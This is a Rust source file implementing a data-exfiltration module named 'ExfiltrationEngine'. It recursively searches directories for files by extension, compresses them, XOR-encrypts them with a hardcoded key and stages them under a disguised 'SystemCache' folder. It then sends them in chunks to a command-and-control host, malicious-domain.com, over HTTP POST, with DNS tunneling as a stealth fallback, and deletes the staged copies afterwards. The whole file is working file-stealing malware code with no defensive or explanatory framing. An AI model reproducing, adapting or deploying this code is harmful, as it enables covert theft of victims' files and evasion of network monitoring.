use std::fs;
use std::path::Path;
use std::collections::VecDeque;
use flate2::Compression;
use flate2::write::GzEncoder;
use std::io::Write;

pub struct ExfiltrationEngine {
    staging_dir: String,
    max_chunk_size: usize,
    c2_client: reqwest::Client,
}

impl ExfiltrationEngine {
    pub fn new() -> Self {
        let staging = format!("{}\\Temp\\SystemCache", std::env::var("LOCALAPPDATA").unwrap());
        let _ = fs::create_dir_all(&staging);
        
        Self {
            staging_dir: staging,
            max_chunk_size: 1024 * 1024, // 1MB chunks
            c2_client: reqwest::Client::new(),
        }
    }
    
    pub fn stage_files(&self, targets: Vec<FileTarget>) -> Vec<StagedFile> {
        let mut staged = Vec::new();
        
        for target in targets {
            if let Ok(files) = self.discover_files(&target) {
                for file in files {
                    if let Ok(staged_file) = self.stage_file(&file) {
                        staged.push(staged_file);
                    }
                }
            }
        }
        
        staged
    }
    
    fn discover_files(&self, target: &FileTarget) -> Result<Vec<std::path::PathBuf>, std::io::Error> {
        let mut files = Vec::new();
        
        if target.recursive {
            for entry in walkdir::WalkDir::new(&target.path)
                .max_depth(5)
                .into_iter()
                .filter_map(|e| e.ok()) {
                
                if entry.file_type().is_file() {
                    let path = entry.path();
                    if self.matches_extensions(path, &target.extensions) {
                        if let Ok(metadata) = fs::metadata(path) {
                            if metadata.len() <= target.max_size {
                                files.push(path.to_path_buf());
                            }
                        }
                    }
                }
            }
        } else {
            if let Ok(entries) = fs::read_dir(&target.path) {
                for entry in entries.flatten() {
                    if let Ok(metadata) = entry.metadata() {
                        if metadata.is_file() {
                            files.push(entry.path());
                        }
                    }
                }
            }
        }
        
        Ok(files)
    }
    
    fn stage_file(&self, path: &Path) -> Result<StagedFile, Box<dyn std::error::Error>> {
        // Read and compress
        let data = fs::read(path)?;
        
        let mut encoder = GzEncoder::new(Vec::new(), Compression::default());
        encoder.write_all(&data)?;
        let compressed = encoder.finish()?;
        
        // Encrypt
        let encrypted = self.encrypt(&compressed);
        
        // Save to staging
        let filename = format!("{:x}.cache", md5::compute(path.to_string_lossy().as_bytes()));
        let staged_path = Path::new(&self.staging_dir).join(&filename);
        fs::write(&staged_path, &encrypted)?;
        
        Ok(StagedFile {
            original_path: path.to_string_lossy().to_string(),
            staged_path: staged_path.to_string_lossy().to_string(),
            size: encrypted.len(),
        })
    }
    
    pub async fn exfiltrate(&self, staged: &[StagedFile]) -> Result<u64, Box<dyn std::error::Error>> {
        let mut total_exfiltrated = 0u64;
        
        for file in staged {
            let data = fs::read(&file.staged_path)?;
            
            // Chunk if necessary
            if data.len() > self.max_chunk_size {
                let chunks: Vec<&[u8]> = data.chunks(self.max_chunk_size).collect();
                for (i, chunk) in chunks.iter().enumerate() {
                    self.send_chunk(&file.original_path, chunk, i, chunks.len()).await?;
                }
            } else {
                self.send_chunk(&file.original_path, &data, 0, 1).await?;
            }
            
            total_exfiltrated += data.len() as u64;
            
            // Cleanup
            let _ = fs::remove_file(&file.staged_path);
            
            // Rate limit
            tokio::time::sleep(std::time::Duration::from_millis(100)).await;
        }
        
        Ok(total_exfiltrated)
    }
    
    async fn send_chunk(&self, filename: &str, data: &[u8], index: usize, total: usize) -> Result<(), Box<dyn std::error::Error>> {
        let encoded = base64::encode(data);
        
        let payload = serde_json::json!({
            "file": filename,
            "chunk": index,
            "total": total,
            "data": encoded,
        });
        
        // Multiple exfiltration channels
        let channels = vec![
            self.http_exfil(&payload).await,
            self.dns_exfil(&payload).await,
        ];
        
        // Try until one succeeds
        for result in channels {
            if result.is_ok() {
                return Ok(());
            }
        }
        
        Err("All exfiltration channels failed".into())
    }
    
    async fn http_exfil(&self, payload: &serde_json::Value) -> Result<(), Box<dyn std::error::Error>> {
        self.c2_client
            .post("https://malicious-domain.com/upload")
            .header("Content-Type", "application/json")
            .json(payload)
            .send()
            .await?;
        Ok(())
    }
    
    async fn dns_exfil(&self, payload: &serde_json::Value) -> Result<(), Box<dyn std::error::Error>> {
        // DNS tunneling for stealth
        let data = base64::encode(payload.to_string());
        let chunks: Vec<String> = data.as_bytes()
            .chunks(63)
            .map(|c| String::from_utf8_lossy(c).to_string())
            .collect();
        
        for (i, chunk) in chunks.iter().enumerate() {
            let domain = format!("{}.{}.malicious-domain.com", chunk, i);
            let _ = tokio::net::lookup_host(domain).await;
        }
        
        Ok(())
    }
    
    fn encrypt(&self, data: &[u8]) -> Vec<u8> {
        // XOR encryption with rotating key
        let key = b"AcademicPhantom2024";
        data.iter()
            .enumerate()
            .map(|(i, b)| b ^ key[i % key.len()])
            .collect()
    }
    
    fn matches_extensions(&self, path: &Path, extensions: &[String]) -> bool {
        if extensions.is_empty() {
            return true;
        }
        
        path.extension()
            .and_then(|e| e.to_str())
            .map(|e| extensions.iter().any(|ext| ext.eq_ignore_ascii_case(e)))
            .unwrap_or(false)
    }
}

pub struct FileTarget {
    pub path: String,
    pub extensions: Vec<String>,
    pub max_size: u64,
    pub recursive: bool,
}

pub struct StagedFile {
    pub original_path: String,
    pub staged_path: String,
    pub size: usize,
}